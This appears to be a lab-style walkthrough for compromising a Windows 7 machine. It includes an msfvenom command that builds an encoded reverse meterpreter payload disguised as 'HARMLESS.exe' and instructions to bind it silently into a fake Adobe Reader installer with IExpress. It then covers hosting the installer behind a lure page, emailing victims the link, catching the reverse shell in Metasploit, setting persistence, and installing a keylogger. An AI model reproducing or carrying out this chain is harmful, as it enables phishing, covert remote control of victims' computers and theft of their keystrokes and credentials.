--------------Tools--------------
Needed for exploit:
Ubuntu Virtual Machine with Apache2 Web server and Metasploit
Windows Virtual Machine with IExpress

Target: 
Windows 7 machine


--------------Initial Setup--------------
On ubuntu:
Create the payload for a reverse meterpreter with msfvenom:
msfvenom -p windows/meterpreter/reverse_tcp lhost=<insert ip address here> lport=4444 -f exe -e x86/shikata_ga_nai -a x86 -o HARMLESS.exe -i 10

Move the file to the Apache2 Web Server
sudo cp HARMLESS.exe /var/www/html/share/HARMLESS.exe

On windows:
download HARMLESS.EXE from the Apache2 web server

Dowload Adobe Reader Installer (or your installer of choice) from https://get.adobe.com/reader/download/?installer=Reader_DC_2020.006.20042_English_for_Windows&os=Windows%2010&browser_type=MSIE&browser_dist=OEM&a=Google_Chrome_6.0.0.0_IE_Browser&p=gtb,mdual,mdual,mss&dualoffer=false&mdualoffer=false&chromedefault=true&cr=true&stype=7556

Use windows IExpress tool to bind HARMLESS.exe and the Adobe Reader Installer so that HARMLESS.exe excutes silently with the Adobe Reader Installer.  Call this new combined file Installer.exe

move Installer.exe to ubuntu VM and copy to /var/www/html/share

change landing page http://10.0.2.15/share/InnocentPDF.html to link to installer.exe

Put your IP address in LHOST for the handler file

send email with landing page link



--------------Performing the Exploit with Ubuntu VM and Metasploit--------------
Open Metasploit on ubuntu

To wait for victim to open exe, run 
resource handler
in metasploit
Any time you lose your meterpreter session, such as when the victim shuts down their computer, you can run 'resource handler' to get another meterpreter session upon reboot.


In meterpreter, get the name of victim user by running
getuid

then move the meterpreter to the background with bg

Replace <THECURRENTUSER> with the name of the victim user in the following files:
deleteKL
deleteKL2
installKL (you can also modify where you want to install the keylogger executable in this file.  If you do change it, make sure it matches with deleteKL2)
rmPersistence


To make meterpreter persistent, run
resource runPersistence
in the metasploit session, then run
set SESSION <whatever number the current session is>
(you can view active sessions by typing sessions)
then run
exploit

go back to the meterpreter session with
sessions -i <whatever number the current session is>


To Install Keylogger, Run 
resource installKL
in the meterpreter session


To delete the keylogger, run 
resource deleteKL
in the meterpreter session.  This will get rid of everything except the executable which you cannot get rid of while it is executing.
then wait for machine to restart and run
resource handler
in metasploit to get the meterpreter session back, then run
resource deleteKL2
in the meterpreter session to get rid of the executable.
You must then run the following from the meterpreter session:
shell
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\RUN\ /v winexplorer
yes
CNTRL+C
y


To get rid of the persistence, run
resource rmPersistence
in the meterpreter session.
You must also run the following from the ensuing cmd session:
rmdir Temp /S/Q
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\RUN\ /v VIRUS
yes
CNTRL+C
y

